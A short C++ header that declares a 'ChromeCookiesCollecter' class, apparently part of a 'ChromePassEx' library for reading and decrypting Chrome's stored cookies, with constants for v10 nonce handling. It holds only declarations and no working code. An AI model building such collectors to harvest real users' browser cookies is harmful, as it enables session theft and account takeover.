#pragma once
#include "WinApiImport.h"
#include "sqlite3.h"
#include "ChromeCollecter.h"
#include <string>
#include <vector>

#include "common.h"

#ifdef ChromePassEx_EXPORTS

#define EXPORT_F __declspec(dllexport)

	#else

#define EXPORT_F 

#endif


#define V10_LEN 3
#define NONCE_LEN 12



class  EXPORT_F ChromeCookiesCollecter : public ChromeCollecter<CookieData>
{
public:
	ChromeCookiesCollecter() : ChromeCollecter<CookieData>() {}
	~ChromeCookiesCollecter() {}
	List<CookieData> collectData() override;

protected:

	void collectFromPath(const String& chromePath) override;
	bool getDbPath(const String& chromePath) override;
	ChromeDecrypt m_decryptor;

};

 

